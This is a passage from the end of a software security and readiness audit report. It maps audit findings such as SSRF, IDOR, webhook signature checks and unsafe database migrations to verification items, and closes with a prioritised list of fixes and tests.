| DB QPS / RPS / latency p50-99 | **REQUIRES EXECUTION** (k6/artillery suite to build) |
| SSE fan-out correctness (1 emit, no per-subscriber DB) | **VERIFIED** — `events.service.ts:39-42` single `EventEmitter` emit |
| Unbounded-query ratchet works | **VERIFIED** — `scripts/audit-unbounded-queries.js` run: "No new unbounded queries. (18 pre-existing)"; wired into CI `ci.yml:111-112` |

## 8. VERIFICATION-PHASE MAPPING (audit → the 15 priorities)

| Verification item | Audit refs |
|---|---|
| P1 db push removal | A7 |
| P2 nine bulk routes | A6 (+ authorization-matrix.spec.ts) |
| P3 webhook signatures | A1 |
| P4 centralized SSRF | A4, A5 (+ outbound-guard wiring) |
| Tenant-isolation/IDOR/bulk test framework | A2, A6 → `cross-tenant-e2e.spec.ts`, `bulk-routes.spec.ts`, IDOR generator |
| Billing concurrency | A8, A9, A13, A18 → concurrency battery |
| RADIUS failure tests | §6, A16, A17 → staging chaos battery |
| Migration timing | A7, bigint ACCESS EXCLUSIVE (20260906120000) — benchmark on staging |
| API DoS load suite | A19 |
| Scale benchmark | §7 — build stages 10k–1M, verdict per claim |
| CSV security | A10 |
| Frontend auth migration | A11, A12, A14, A15 → cookie plan |
| CI/CD | A6, A7 (ratchets exist: `ci.yml:70-74,111-112`; add fail-closed + bulk-route + webhook ratchets) |
| Deployment safety | A7, A20, A21 (migrate-fail ⇒ stop; preflight; health; rollback) |
| Final evidence report | this document + re-run after fixes |

## 9. ACTION SUMMARY (first commit batch)

1. **Priority 1 (this session):** remove `--accept-data-loss` from unattended paths; `update-jointbox.sh` fails closed on failed migration; regression spec `db-push-safety.spec.ts`.
2. **Priority 3:** webhook signature verification (pattern exists in `src/gateway`).
3. **Priority 4:** wire `outbound-guard` into alerts/syslog/SNMP + reject loopback everywhere.
4. **Priority 2:** fail-closed matrix + actor-fy the 9 bulk routes + unscoped family.
5. Test suite: cross-tenant / IDOR / bulk / billing-concurrency; then staging chaos + benchmarks.

*Document ends. Every finding is VERIFIED from source unless explicitly marked otherwise; nothing in this repo supports unreserved readiness claims.*